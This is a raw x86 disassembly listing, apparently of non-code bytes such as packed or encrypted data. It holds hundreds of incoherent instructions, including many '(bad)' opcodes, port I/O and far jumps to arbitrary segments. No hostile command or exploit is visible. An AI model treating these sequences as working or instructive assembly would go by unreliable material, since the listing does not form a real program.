  40307a:	cmp    eax,0xc8eeb9c4
  40307f:	in     eax,0x96
  403081:	mov    BYTE PTR [ebp+ebp*4-0x66],cl
  403085:	adc    DWORD PTR [eax],edi
  403087:	sbb    DWORD PTR [esi+0x3c0da3d8],esp
  40308d:	addr16 test eax,0xab3f6b83
  403093:	add    ecx,DWORD PTR [eax+0x3e]
  403096:	lods   al,BYTE PTR ds:[esi]
  403097:	push   0xfbfe4632
  40309c:	push   0xffffffb9
  40309e:	jge    0x4030a8
  4030a0:	sub    bh,BYTE PTR [ecx]
  4030a2:	cli    
  4030a3:	mov    ebx,0xaf721453
  4030a8:	and    DWORD PTR [ebp-0x22],0x9598e512
  4030af:	mov    cl,0xe5
  4030b1:	shl    BYTE PTR [esi-0x1b86cc04],cl
  4030b7:	ins    DWORD PTR es:[edi],dx
  4030b8:	push   ds
  4030b9:	std    
  4030ba:	xor    esp,edx
  4030bc:	push   edi
  4030bd:	enter  0xc3de,0xbf
  4030c1:	(bad)  
  4030c2:	and    dl,bl
  4030c4:	pop    eax
  4030c5:	push   edx
  4030c6:	in     al,0x96
  4030c8:	mov    cl,0xc2
  4030ca:	push   cs
  4030cb:	mov    ebp,0x916a1814
  4030d0:	dec    eax
  4030d1:	cmc    
  4030d2:	je     0x40313e
  4030d4:	xchg   BYTE PTR [edi+ebp*4+0x5b],bl
  4030d8:	cmp    DWORD PTR [eax-0x2ec85203],ecx
  4030de:	into   
  4030df:	leave  
  4030e0:	mov    ecx,0xef7ad4fa
  4030e5:	and    DWORD PTR [edi+ebp*1-0x1f],ebx
  4030e9:	pop    ebp
  4030ea:	pop    esp
  4030eb:	addr16 dec esi
  4030ed:	xor    al,0x27
  4030ef:	bound  esi,QWORD PTR [ebx-0x31]
  4030f2:	mov    ebp,ebx
  4030f4:	imul   esp,esp,0xffffffaf
  4030f7:	(bad)  [edi]
  4030f9:	das    
  4030fa:	clc    
  4030fb:	cmp    dl,0x94
  4030fe:	and    al,0x52
  403100:	dec    esp
  403101:	ja     0x4030fc
  403103:	in     eax,0x42
  403105:	das    
  403106:	mov    DWORD PTR [esi-0x215750dd],ecx
  40310c:	fdivr  QWORD PTR [edx-0x3b7d1fd3]
  403112:	call   0xbdc6d155
  403117:	fistp  WORD PTR [ecx+0x2496a7d1]
  40311d:	sahf   
  40311e:	sub    dl,0xc5
  403121:	iret   
  403122:	xchg   esp,eax
  403123:	aaa    
  403124:	dec    ecx
  403125:	adc    BYTE PTR [ebx],bl
  403127:	adc    DWORD PTR [eax],esi
  403129:	mov    fs,WORD PTR ds:0xab46ec8d
  40312f:	std    
  403130:	pusha  
  403131:	jmp    0x6e94:0x603d8d38
  403138:	ins    BYTE PTR es:[edi],dx
  403139:	xor    DWORD PTR [edi],esp
  40313b:	push   edi
  40313c:	dec    ecx
  40313d:	stc    
  40313e:	xor    ah,BYTE PTR [eax]
  403140:	inc    ebp
  403141:	and    DWORD PTR ds:0xb99dab50,0x4626057e
  40314b:	xor    bh,BYTE PTR [edi-0x32]
  40314e:	(bad)  
  403150:	pop    ebp
  403151:	xor    bh,bh
  403153:	sbb    esi,ebx
  403155:	scas   al,BYTE PTR es:[edi]
  403156:	push   ecx
  403157:	(bad)  
  403158:	pop    ebx
  403159:	out    dx,eax
  40315a:	in     al,0x26
  40315c:	mov    eax,0xc277c816
  403161:	push   ds
  403162:	outs   dx,BYTE PTR ds:[esi]
  403163:	js     0x4031c7
  403165:	stos   BYTE PTR es:[edi],al
  403166:	pop    ds
  403167:	in     al,0xeb
  403169:	fist   WORD PTR [edx+0x7fb29a38]
  40316f:	xor    edi,ecx
  403171:	jmp    0x403527
  403176:	data16 aas 
  403178:	in     eax,dx
  403179:	int3   
  40317a:	jne    0x403166
  40317c:	popa   
  40317d:	jno    0x4031dd
  40317f:	imul   esp,DWORD PTR [ebx],0x747f5a87
  403185:	mov    eax,ds:0x7070153e
  40318a:	xchg   edi,eax
  40318b:	jge    0x4031fd
  40318d:	jo     0x4031ca
  40318f:	mov    ds:0xb7599765,al
  403194:	fisubr DWORD PTR [eiz*8+0x67bd638e]
  40319b:	mov    al,ds:0xb2f3c8b5
  4031a0:	mov    WORD PTR [ebp-0x7cda6f6d],es
  4031a6:	mov    ds,ebp
  4031a8:	in     eax,dx
  4031a9:	pushf  
  4031aa:	lds    esp,FWORD PTR [esi-0x19528ff]
  4031b0:	cld    
  4031b1:	cs stc 
  4031b3:	shl    BYTE PTR [ecx+0x7150edf5],0x4a
  4031ba:	xchg   edi,eax
  4031bb:	jle    0x403150
  4031bd:	xor    esp,DWORD PTR [ecx-0x51]
  4031c0:	scas   eax,DWORD PTR es:[edi]
  4031c1:	inc    esi
  4031c2:	js     0x4031a1
  4031c4:	scas   al,BYTE PTR es:[edi]
  4031c5:	mov    dh,bh
  4031c7:	aas    
  4031c8:	push   esp
  4031c9:	mov    cl,0x89
  4031cb:	mov    cl,0x61
  4031cd:	out    0xfd,eax
  4031cf:	repnz inc esi
  4031d1:	jbe    0x40316c
  4031d3:	mov    edx,ds
  4031d5:	add    edx,DWORD PTR [ebx+edx*1-0x4dd21fe4]
  4031dc:	in     eax,dx
  4031dd:	arpl   WORD PTR [eax-0x52],bx
  4031e0:	adc    BYTE PTR [ecx-0x6be9352d],al
  4031e6:	cld    
  4031e7:	std    
  4031e8:	xor    esi,edx
  4031ea:	add    bh,BYTE PTR [ebp+0x10dfe3b4]
  4031f0:	and    cl,BYTE PTR [eax-0x477e5c42]
  4031f6:	inc    edx
  4031f7:	xchg   esp,eax
  4031f8:	push   0x55f8bd56
  4031fd:	pusha  
  4031fe:	mov    esp,0x81ac2cb0
  403203:	mov    esp,0xb6f43f2b
  403208:	outs   dx,DWORD PTR ds:[esi]
  403209:	in     al,0xf1
  40320b:	minps  xmm3,xmm3
  40320e:	fidiv  WORD PTR [esp+eiz*8]
  403211:	xchg   esp,eax
  403212:	jbe    0x4031f6
  403214:	fimul  DWORD PTR ds:0xea562e4d
  40321a:	mov    ch,BYTE PTR [ecx-0x1570354]
  403220:	sub    ah,dl
  403222:	loop   0x403271
  403224:	and    al,BYTE PTR [ebp-0x55]
  403227:	xchg   esp,eax
  403228:	call   0xc847:0x5f44818d
  40322f:	push   eax
  403230:	dec    edx
  403231:	out    dx,al
  403232:	test   DWORD PTR [ebp-0x14],0x35e6916f
  403239:	je     0x4032a8
  40323b:	dec    edi
  40323c:	mov    cl,0x3c
  40323e:	stc    
  40323f:	fnstcw WORD PTR [esi+ecx*2-0x59dac34]
  403246:	leave  
  403247:	mov    dh,0x4d
  403249:	dec    ebp
  40324a:	popf   
  40324b:	aaa    
  40324c:	jl     0x403255
  40324e:	fisub  DWORD PTR [ecx+0x15]
  403251:	fucomi st,st(6)
  403253:	in     eax,dx
  403254:	loope  0x4031e4
  403256:	and    esi,DWORD PTR [eax]
  403258:	pop    ss
  403259:	adc    esi,ebx
  40325b:	mov    cl,0xde
  40325d:	xor    al,0x5d
  40325f:	adc    dl,0xb0
  403262:	xor    DWORD PTR [edi+edi*1-0x20279ca0],eax
  403269:	enter  0x358b,0x8e
  40326d:	mov    edi,0x41feebab
  403272:	and    eax,0xa010c41f
  403277:	push   esi
  403278:	out    0x5d,al
  40327a:	adc    al,0xef
  40327c:	popf   
  40327d:	popa   
  40327e:	stc    
  40327f:	lods   eax,DWORD PTR ds:[esi]
  403280:	pop    ebx
  403281:	add    DWORD PTR [ebx-0x1],edx
  403284:	jle    0x40321e
  403286:	aad    0x28
  403288:	push   esi
  403289:	jno    0x403242
  40328b:	mov    ah,0x52
  40328d:	ret    0x76b0
  403290:	cmp    eax,0x306a9afd
  403295:	pop    ebp
  403296:	mov    ch,0x91
  403298:	sub    ecx,ecx
  40329a:	std    
  40329b:	arpl   WORD PTR [esi+0x50de42d1],bx
  4032a1:	sub    edx,eax
  4032a3:	ins    BYTE PTR es:[edi],dx
  4032a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4032a5:	sar    BYTE PTR [ecx+0x467ff4c],0x46
  4032ac:	sbb    ah,ch
  4032ae:	iret   
  4032af:	out    dx,al
  4032b0:	ror    al,cl
  4032b2:	out    0x3e,al
  4032b4:	mov    fs,esp
  4032b6:	and    edx,0x4f
  4032b9:	cwde   
  4032ba:	sti    
  4032bb:	fwait
  4032bc:	int3   
  4032bd:	xchg   BYTE PTR [edx-0x7cd407e],al
  4032c3:	and    al,0xf6
  4032c5:	add    eax,0xd3134f85
  4032ca:	xchg   esi,eax
  4032cb:	out    dx,al
  4032cc:	int    0x4d
  4032ce:	xchg   DWORD PTR [edi+0x66119be1],ebp
  4032d4:	sub    al,0xfd
  4032d6:	add    al,0x71
  4032d8:	sbb    edx,DWORD PTR [edx-0x2c]
  4032db:	mov    al,0xd1
  4032dd:	fsub   st,st(3)
  4032df:	sub    BYTE PTR [edx],al
  4032e1:	and    al,0x9e
  4032e3:	xchg   ecx,eax
  4032e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4032e5:	jle    0x40331b
  4032e7:	mov    esi,0xbd860e19
  4032ec:	lea    edi,[edx+0x27adcebe]
  4032f2:	fdivrp st(4),st
  4032f4:	jne    0x403285
  4032f6:	fistp  WORD PTR ds:0xfaddf4db
  4032fc:	cs pop ecx
  4032fe:	arpl   WORD PTR [edx],ax
  403300:	cmp    esi,ebp
  403302:	sub    eax,0x2e5e74c4
  403307:	js     0x4032b5
  403309:	shr    ah,1
  40330b:	nop
  40330c:	adc    ah,BYTE PTR [esi-0x58db46f4]
  403312:	jle    0x403373
  403314:	pop    ebp
  403315:	(bad)  
  403316:	and    cl,BYTE PTR [eax]
  403318:	push   ds
  403319:	push   eax
  40331a:	sub    al,0x37
  40331c:	rol    BYTE PTR [eax+0x7c],0xde
  403320:	lods   al,BYTE PTR ds:[esi]
  403321:	mov    fs,WORD PTR [ecx]
  403323:	sbb    eax,0x476d5c34
  403328:	cmp    dh,al
  40332a:	arpl   bx,di
  40332c:	push   edi
  40332d:	popf   
  40332e:	retf   
  40332f:	dec    ebp
  403330:	lahf   
  403331:	pop    ebp
  403332:	jp     0x40339f
  403334:	in     eax,0x6b
  403336:	push   ebx
  403337:	xchg   ebp,eax
  403338:	push   ss
  403339:	or     al,0x8e
  40333b:	std    
  40333c:	pushf  
  40333d:	(bad)  
  40333e:	in     eax,0x4b
  403340:	sub    ebx,esp
  403342:	out    0xa,al
  403344:	jmp    DWORD PTR [ecx+0xb]
  403347:	cmp    al,0x50
  403349:	push   0x1d
  40334b:	add    edx,ebx
  40334d:	in     al,0xe0
  40334f:	add    al,BYTE PTR [eax]
  403351:	and    eax,DWORD PTR [ebx]
  403353:	adc    eax,0xe92b2f2c
  403358:	ret    0x3b34
  40335b:	hlt    
  40335c:	(bad)  
  40335e:	pop    edx
  40335f:	(bad)  
  403360:	out    0x77,al
  403362:	aam    0x33
  403364:	add    al,0xb8
  403366:	push   esp
  403367:	xor    dh,BYTE PTR [ecx-0x35682d66]
  40336d:	(bad)  
  40336e:	push   esi
  40336f:	push   0xcad52042
  403374:	out    dx,al
  403375:	sar    DWORD PTR [edi],cl
  403377:	push   edx
  403378:	xor    al,0xa0
  40337a:	repnz push eax
  40337c:	mov    cs,ebp
  40337e:	imul   esp,DWORD PTR [ebp+esi*2+0x1a],0x9d87b50f
  403386:	mov    ebp,ss
  403388:	cmp    BYTE PTR [ebp-0x45],al
  40338b:	loope  0x403386
  40338d:	cld    
  40338e:	sbb    al,0x21
  403390:	(bad)  
  403392:	dec    edx
  403393:	xchg   ecx,eax
  403394:	fnstsw WORD PTR [ecx]
  403396:	loop   0x403362
  403398:	gs push 0xffffffbe
  40339b:	lods   al,BYTE PTR ds:[esi]
  40339c:	(bad)  
  40339d:	loopne 0x403380
  40339f:	call   0x41f8:0x6ad649e4
  4033a6:	setl   BYTE PTR [edx+edx*2+0x257ec07f]
  4033ae:	jl     0x40341f
  4033b0:	sti    
  4033b1:	mov    dl,0xb4
  4033b3:	dec    esi
  4033b4:	in     al,0xa8
  4033b6:	daa    
  4033b7:	or     eax,0x6d520518
  4033bc:	sub    al,0x15
  4033be:	push   ds
  4033bf:	fs push ebp
  4033c1:	repz stc 
  4033c3:	leave  
  4033c4:	out    dx,al
  4033c5:	shr    BYTE PTR [eax+0x24],0x67
  4033c9:	jg     0x4033d9
  4033cb:	and    al,0x8e
  4033cd:	mov    ecx,0x96dc0b2d
  4033d2:	xchg   esp,eax
  4033d3:	aad    0xe2
  4033d5:	sub    bl,BYTE PTR [ebx-0x26]
  4033d8:	cdq    
  4033d9:	add    al,0x79
  4033db:	aam    0xeb
  4033dd:	shl    ebp,cl
  4033df:	aas    
  4033e0:	lds    ebx,FWORD PTR [edi-0x4f]
  4033e3:	test   al,0xeb
  4033e5:	cmp    BYTE PTR [ebp-0x366fa56a],ch
  4033eb:	retf   0x5140
  4033ee:	push   0x26
  4033f0:	call   0x350e3465
  4033f5:	mov    edx,0x47bbb590
  4033fa:	jg     0x403424
  4033fc:	ss jecxz 0x4033ee
  4033ff:	and    eax,0xa576bb51
  403404:	retf   
  403405:	add    dl,BYTE PTR [ebp-0xf6e52b7]
  40340b:	adc    ecx,ecx
  40340d:	jb     0x403412
  40340f:	in     eax,0x1
  403411:	(bad)  
  403412:	cmp    eax,0x65f3ecbd
  403417:	loopne 0x40342b
  403419:	inc    ebx
  40341a:	jb     0x40343f
  40341c:	lods   al,BYTE PTR ds:[esi]
  40341d:	in     al,dx
  40341e:	inc    esi
  40341f:	xchg   dl,ch
  403421:	int    0x2c
  403423:	(bad)
  403427:	fcmove st,st(5)
  403429:	jno    0x403473
  40342b:	dec    ebx
  40342c:	sub    BYTE PTR [ebp+0x41],0x2a
  403430:	xchg   esi,eax
  403431:	loopne 0x403454
  403433:	inc    esp
  403434:	push   esp
  403435:	dec    DWORD PTR [eax+0x4d4c8e0c]
  40343b:	call   esp
  40343d:	leave  
  40343e:	jl     0x4033c6
  403440:	mov    bl,0xcb
  403442:	test   DWORD PTR [ecx+0x32d6eeec],edx
  403448:	clc    
  403449:	dec    edi
  40344a:	or     DWORD PTR [edx],ebp
  40344c:	or     eax,0xd273cea8
  403451:	add    esp,DWORD PTR [ebp+0x17]
  403454:	add    BYTE PTR [ebp-0x24566bc0],dl
  40345a:	sub    ah,BYTE PTR [ebp+0x17ddbc39]
  403460:	or     al,0x47
  403462:	ins    BYTE PTR es:[edi],dx
  403463:	shr    BYTE PTR [esi-0x2a],0xe5
  403467:	lods   eax,DWORD PTR ds:[esi]
  403468:	fs in  eax,dx
  40346a:	push   0x64925fc2
  40346f:	mov    ebp,0xf111283a
  403474:	ds mov edx,?
  403477:	xchg   ebp,eax
  403478:	adc    bh,BYTE PTR [ecx-0x78]
  40347b:	xchg   ebp,eax
  40347c:	push   edi
  40347d:	add    BYTE PTR [eax],al
  40347f:	in     eax,0x9b
  403481:	push   esp
  403482:	(bad)  
  403484:	(bad)  
  403485:	jnp    0x4034ea
  403487:	imul   esp,DWORD PTR [esi+0xa],0xf0331d6d
  40348e:	mov    ss,WORD PTR [ebx]
  403490:	jmp    0xdd1f:0x84669585
  403497:	popa   
  403498:	sbb    BYTE PTR [esi+0x4fd8a297],bh
  40349e:	jmp    0x1ce0be0f
  4034a3:	mov    DWORD PTR [esp+0x10efd5b2],ebp
  4034aa:	jmp    0x40351e
  4034ac:	nop
  4034ad:	mov    dh,0x6b
  4034af:	mov    eax,ds:0x93cc8755
  4034b4:	dec    edx
  4034b5:	out    dx,al
  4034b6:	jl     0x403462
  4034b8:	adc    edi,DWORD PTR cs:[ebx+0x42]
  4034bc:	imul   esp,esi,0xed73145c
  4034c2:	outs   dx,DWORD PTR ds:[esi]
  4034c3:	ret    
  4034c4:	mov    eax,0x5e30cd38
  4034c9:	in     eax,dx
  4034ca:	cmp    dh,BYTE PTR [ebx+ebp*1-0xb32f9ed]
  4034d1:	clc    
  4034d2:	mov    bh,0x88
  4034d4:	aaa    
  4034d5:	or     dh,al
  4034d7:	cmp    ebp,DWORD PTR [edx+0x7273b219]
  4034dd:	lock or eax,0xcf029bce
  4034e3:	add    al,0xc6
  4034e5:	cs xchg ebx,eax
  4034e7:	sahf   
  4034e8:	pop    esp
  4034e9:	adc    edi,DWORD PTR [edi]
  4034eb:	mov    ebx,0x9b73b1fe
  4034f0:	sub    bh,cl
  4034f2:	xchg   esi,eax
  4034f3:	cli    
  4034f4:	and    al,0xf7
  4034f6:	(bad)  
  4034f7:	pop    esp
  4034f8:	add    ebx,DWORD PTR [ebp+0x76]
  4034fb:	xchg   ebx,eax
  4034fc:	(bad)  
  4034fd:	sub    edi,esp
  4034ff:	add    ah,BYTE PTR [esi+0x20609d53]
  403505:	mov    bl,0xdf
  403507:	jg     0x4034b6
  403509:	out    0x2d,eax
  40350b:	and    ch,bl
  40350d:	adc    DWORD PTR [ebp+0x26],esp
  403510:	add    dl,ch
  403512:	dec    esi
  403513:	scas   al,BYTE PTR es:[edi]
  403514:	pop    ds
  403515:	scas   al,BYTE PTR es:[edi]
  403516:	mov    dh,0x62
  403518:	push   ss
  403519:	xor    al,0x9b
  40351b:	push   esi
  40351c:	cli    
  40351d:	mul    ah
  40351f:	inc    ebp
  403520:	sbb    BYTE PTR [eax],0x3f
  403523:	sbb    BYTE PTR [edx-0x1],bl
  403526:	or     eax,0x758bfe03
  40352b:	or     BYTE PTR [edi],cl
  40352d:	scas   eax,DWORD PTR es:[edi]
  40352e:	cli    
  40352f:	mov    ebx,DWORD PTR [ebp+0xc]
  403532:	jmp    0x4038e8
  403537:	jle    0x4034ce
  403539:	mov    esi,0x45d75507
  40353e:	xchg   ebp,eax
  40353f:	icebp  
  403540:	repz cs jle 0x403520
  403544:	sti    
  403545:	push   esi
  403546:	rcl    DWORD PTR [ebp+0x12],cl
  403549:	jo     0x4035bb
  40354b:	xchg   edi,eax
  40354c:	jge    0x4035be
  40354e:	jo     0x4035ac
  403550:	and    al,0x26
  403552:	lods   eax,DWORD PTR ds:[esi]
  403553:	add    BYTE PTR [ecx],ah
  403555:	jl     0x4035aa
  403557:	rcr    ch,1
  403559:	shl    BYTE PTR [edi+0x53],1
  40355c:	in     al,0x6f
  40355e:	inc    edi
  40355f:	dec    BYTE PTR [ecx+0x48b97f8f]
  403565:	xchg   edi,eax
  403566:	cwde   
  403567:	jb     0x40354d
  403569:	pop    eax
  40356a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40356b:	sahf   
  40356c:	mov    ebx,0xcbb4c1d1
  403571:	pusha  
  403572:	mov    BYTE PTR [esi+0x3c],dl
  403575:	rcl    DWORD PTR [ebp+0x3ecd06e1],0x7d
  40357c:	push   eax
  40357d:	push   0x4a
  40357f:	cmp    ecx,DWORD PTR ds:0x5a77f9ea
  403585:	test   DWORD PTR [edx+0x3676e7d4],0xdd7481a2
  40358f:	fwait
  403590:	into   
  403591:	and    eax,0xd836ac02
  403596:	mov    ecx,0xb652cb04
  40359b:	xchg   ecx,eax
  40359c:	adc    al,0x8f
  40359e:	cs daa 
  4035a0:	and    al,0xb0
  4035a2:	dec    ebx
  4035a3:	and    eax,DWORD PTR [ebx]
  4035a5:	jecxz  0x4035c1
  4035a7:	xchg   edi,eax
  4035a8:	addr16 jne 0x403585
  4035ab:	(bad)
  4035ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4035af:	mov    bl,0x2c
  4035b1:	push   cs
  4035b2:	dec    esp
  4035b3:	leave  
  4035b4:	inc    ebp
  4035b5:	sub    esp,ebx
  4035b7:	add    al,0x4a
  4035b9:	loope  0x4035fd
  4035bb:	adc    DWORD PTR [ebp*2+0x650bca84],0x42
  4035c3:	xor    DWORD PTR [eax-0x4f61d496],0xffffff8c
  4035ca:	add    cl,BYTE PTR [ecx+0x2a]
  4035cd:	sti    
  4035ce:	lahf   
  4035cf:	xchg   edi,eax
  4035d0:	(bad)  
  4035d1:	retf   
  4035d2:	sub    esi,DWORD PTR [ebp+0x4]
  4035d5:	dec    edi
  4035d6:	shl    DWORD PTR [eax+0x69],0x33
  4035da:	jg     0x40356c
  4035dc:	jnp    0x4035a8
  4035de:	push   edx
  4035df:	xchg   esp,eax
  4035e0:	inc    edi
  4035e1:	mov    ah,0x33
  4035e3:	test   al,0x75
  4035e5:	mov    esp,0x3855abc0
  4035ea:	popa   
  4035eb:	inc    eax
  4035ec:	adc    cl,ah
  4035ee:	adc    BYTE PTR [ecx+ebx*8+0xfad6e7d],0xb5
  4035f6:	or     bh,al
  4035f8:	cmp    bh,ah
  4035fa:	sbb    DWORD PTR [ecx],edx
  4035fc:	lods   eax,DWORD PTR ds:[esi]
  4035fd:	mov    bh,0x51
  4035ff:	shl    BYTE PTR [eax+0x62],1
  403602:	jo     0x4035a4
  403604:	pop    ecx
  403605:	mov    ds:0x6cca0f66,al
  40360a:	icebp  
  40360b:	loope  0x4035d2
  40360d:	pushf  
  40360e:	cmp    esi,eax
  403610:	cdq    
  403611:	into   
  403612:	out    0x56,eax
  403614:	push   ss
  403615:	lea    esp,[esi]
  403617:	loopne 0x40362b
  403619:	pmuludq mm3,QWORD PTR [edx]
  40361c:	push   edx
  40361d:	ins    BYTE PTR es:[edi],dx
  40361e:	xchg   edx,eax
  40361f:	(bad)  
  403620:	adc    BYTE PTR [ecx-0x2ead1153],al
  403626:	sbb    DWORD PTR [edi-0x11],ebx
  403629:	push   cs
  40362a:	pop    edx
  40362b:	inc    esi
  40362c:	aaa    
  40362d:	test   ecx,ebp
  40362f:	arpl   WORD PTR [ecx],si
  403631:	and    BYTE PTR [eax],bl
  403633:	xor    BYTE PTR [eax],bl
  403635:	cs clc 
  403637:	sbb    ebp,DWORD PTR [ecx+0x69e2455e]
  40363d:	cld    
  40363e:	imul   ebp,DWORD PTR [ecx],0xd9b54ad3
  403644:	push   ebp
  403645:	cli    
  403646:	in     al,dx
  403647:	cmp    bl,BYTE PTR es:[esi-0x1f]
  40364b:	fadd   st(3),st
  40364d:	test   eax,0x8cfb884e
  403652:	push   edx
  403653:	or     bh,BYTE PTR [ebp*8-0x1e19e57c]
  40365a:	mov    ecx,0x57de14e2
  40365f:	cmp    DWORD PTR ds:0x78a05f9b,0x33
  403666:	retf   0x8fe1
  403669:	dec    esi
  40366a:	rol    BYTE PTR [esi+eax*4-0x4c],cl
  40366e:	cmp    al,0xcf
  403670:	xchg   edx,eax
  403671:	or     BYTE PTR [esi+edi*2-0x4e24bc3f],dh
  403678:	and    ah,ch
  40367a:	in     eax,0x43
  40367c:	out    0x2c,eax
  40367e:	add    BYTE PTR [ebx],0x26
  403681:	jbe    0x403685
  403683:	ins    DWORD PTR es:[edi],dx
  403684:	push   ss
  403685:	sbb    BYTE PTR [ecx],bl
  403687:	pop    es
  403688:	cli    
  403689:	xchg   ebx,eax
  40368a:	jl     0x403654
  40368c:	jg     0x40368c
  40368e:	sbb    BYTE PTR [esi-0x5c738ccf],0x9c
  403695:	jle    0x40361e
  403697:	pop    esp
  403698:	out    dx,eax
  403699:	daa    
  40369a:	ds loopne 0x40371a
  40369d:	scas   al,BYTE PTR es:[edi]
  40369e:	xor    DWORD PTR [esi],esp
  4036a0:	push   es
  4036a1:	retf   
  4036a2:	into   
  4036a3:	dec    eax
  4036a4:	scas   al,BYTE PTR es:[edi]
  4036a5:	or     al,0x2b
  4036a7:	push   esp
  4036a8:	leave  
  4036a9:	mov    DWORD PTR [ebp-0x37a62b3a],0xa3607dc2
  4036b3:	popa   
  4036b4:	cmp    BYTE PTR ds:0x782c6d47,0x61
  4036bb:	cmp    eax,0xba285dd6
  4036c0:	xchg   ebx,eax
  4036c1:	sbb    ebx,DWORD PTR [ecx-0x13decabf]
  4036c7:	mov    BYTE PTR [edx+edx*2+0x44be2ccc],bh
  4036ce:	mov    edx,0xb63a284e
  4036d3:	jnp    0x403662
  4036d5:	in     al,dx
  4036d6:	xor    dh,dl
  4036d8:	out    0x98,eax
  4036da:	xchg   BYTE PTR [edi+0x5e],ch
  4036dd:	scas   al,BYTE PTR es:[edi]
  4036de:	fnstenv [edi+ebx*8+0x74]
  4036e2:	icebp  
  4036e3:	lds    edi,FWORD PTR [edx+0x7085181c]
  4036e9:	jmp    0x4036bb
  4036eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4036ec:	pushf  
  4036ed:	xchg   ebx,eax
  4036ee:	lock shl DWORD PTR [ebp+edi*8-0x5e],0x16
  4036f4:	xor    al,0x4b
  4036f6:	inc    ebp
  4036f7:	call   0x6fd9:0x5bfc3fd6
  4036fe:	jmp    0x2da:0xa54923c3
  403705:	popa   
  403706:	dec    ebp
  403707:	dec    eax
  403708:	in     al,0xe7
  40370a:	call   0x458d:0x29a25f45
  403711:	retf   0xa546
  403714:	xlat   BYTE PTR ds:[ebx]
  403715:	fisubr DWORD PTR [edi+0x12]
  403718:	(bad)  
  40371a:	ja     0x403778
  40371c:	jmp    0x40371f
  40371e:	outs   dx,BYTE PTR ds:[esi]
  40371f:	jmp    0x403718
  403721:	lods   eax,DWORD PTR ds:[esi]
  403722:	mov    edx,0x51fd9a5
  403727:	daa    
  403728:	test   edx,ebx
  40372a:	cld    
  40372b:	sub    esp,DWORD PTR [ebp+0x33]
  40372e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40372f:	pop    ds
  403730:	(bad)  
  403731:	stos   BYTE PTR es:[edi],al
  403732:	cmp    eax,edx
  403734:	sahf   
  403735:	push   ebp
  403736:	and    esi,DWORD PTR [edx]
  403738:	mov    esp,0xc7bee7f4
  40373d:	jmp    0xa9487167
  403742:	jl     0x4036e3
  403744:	cmp    BYTE PTR [edx+0x6f],dh
  403747:	popa   
  403748:	leave  
  403749:	fs ins BYTE PTR es:[edi],dx
  40374b:	mov    edx,0x64c04464
  403750:	xor    BYTE PTR [ebp+0x4b0496cd],dl
  403756:	cmp    BYTE PTR [esi-0x18],0x5
  40375a:	fcomp  st(5)
  40375c:	(bad)  
  40375e:	push   ecx
  40375f:	ret    0x996d
  403762:	or     eax,0xbf053d89
  403767:	push   eax
  403768:	shl    DWORD PTR [ecx+0x79],cl
  40376b:	xor    BYTE PTR [ebx],dl
  40376d:	xor    BYTE PTR [esi+0x2c],bh
  403770:	xchg   BYTE PTR [eax+0x3f],ah
  403773:	inc    edx
  403774:	mov    eax,0x5317d2c8
  403779:	push   dx
  40377b:	data16 jmp 0x40377f
  40377e:	in     al,dx
  40377f:	fs push 0xffffffda
  403782:	or     al,0xa7
  403784:	cmp    DWORD PTR [edx+0x20],ecx
  403787:	ja     0x4037aa
  403789:	adc    BYTE PTR [edx+edx*4-0x39],0xf3
  40378e:	outs   dx,DWORD PTR ds:[esi]
  40378f:	cs mov esp,0x35476e7b
  403795:	cmp    eax,0x35b4bf49
  40379a:	scas   al,BYTE PTR es:[edi]
  40379b:	into   
  40379c:	ret    0x339d
  40379f:	mov    dh,0xed
  4037a1:	jecxz  0x403813
  4037a3:	pop    es
  4037a4:	sahf   
  4037a5:	inc    ecx
  4037a6:	lahf   
  4037a7:	mov    dl,0xde
  4037a9:	das    
  4037aa:	mov    ah,0x45
  4037ac:	inc    eax
  4037ad:	ja     0x40381d
  4037af:	cmp    al,0x5a
  4037b1:	mov    DWORD PTR es:[edi-0x63],0x3abaa2e3
  4037b9:	jns    0x403750
  4037bb:	jmp    0x40378a
  4037bd:	sub    al,0x97
  4037bf:	add    al,0x30
  4037c1:	jno    0x4037bd
  4037c3:	test   BYTE PTR [edx+0x4a],bl
  4037c6:	mov    al,0x87
  4037c8:	fs xchg esi,eax
  4037ca:	add    DWORD PTR gs:[ebp+eax*8+0x66ab5b89],edi
  4037d2:	push   esi
  4037d3:	mov    WORD PTR [ebp+0x7a],cs
  4037d6:	(bad)  
  4037d7:	ins    BYTE PTR es:[edi],dx
  4037d8:	jl     0x403773
  4037da:	fmul   DWORD PTR [ebx]
  4037dc:	aas    
  4037dd:	dec    ecx
  4037de:	ss push edi
  4037e0:	jmp    0xb74f8b0e
  4037e5:	push   ebx
  4037e6:	mov    esi,0x7f67af58
  4037eb:	in     al,dx
  4037ec:	inc    edi
  4037ed:	and    al,0x51
  4037ef:	inc    edi
  4037f0:	pop    edi
  4037f1:	dec    eax
  4037f2:	or     ecx,esi
  4037f4:	popa   
  4037f5:	dec    ebp
  4037f6:	inc    ecx
  4037f7:	mov    ds:0x82143b18,ax
  4037fd:	xchg   edx,eax
  4037fe:	add    al,0xe7
  403800:	push   edx
  403801:	sbb    DWORD PTR [ebx],edi
  403803:	fnsave [edi]
  403805:	sbb    bh,BYTE PTR [eax-0x44]
  403808:	popf   
  403809:	sbb    DWORD PTR [edx+0x8e262e0],edx
  40380f:	sub    eax,0x4347d0d3
  403814:	ss aam 0x20
  403817:	ret    
  403818:	mov    bl,0x46
  40381a:	out    dx,eax
  40381b:	mov    eax,DWORD PTR [eax-0x6c]
  40381e:	pop    ecx
  40381f:	or     eax,0xc51daa59
  403824:	jecxz  0x4037b8
  403826:	and    bl,BYTE PTR [ebp-0x2e]
  403829:	mov    edx,0x3fe0ac6a
  40382e:	jne    0x4037e6
  403830:	cmp    BYTE PTR [edi],ch
  403832:	and    eax,0x94b27b08
  403837:	or     BYTE PTR [esi],dl
  403839:	inc    ebp
  40383a:	repnz and edi,DWORD PTR [esi-0x5c7549c9]
  403841:	cmp    dl,bh
  403843:	push   0x3e6cd07f
  403848:	jmp    0x5dd707e0
  40384d:	pop    es
  40384e:	dec    ebp
  40384f:	jno    0x4037f4
  403851:	ret    
  403852:	cmp    DWORD PTR [edx-0x33b270a6],ebx
  403858:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403859:	fcos   
  40385b:	cli    
  40385c:	and    BYTE PTR [esi],bh
  40385e:	push   cs
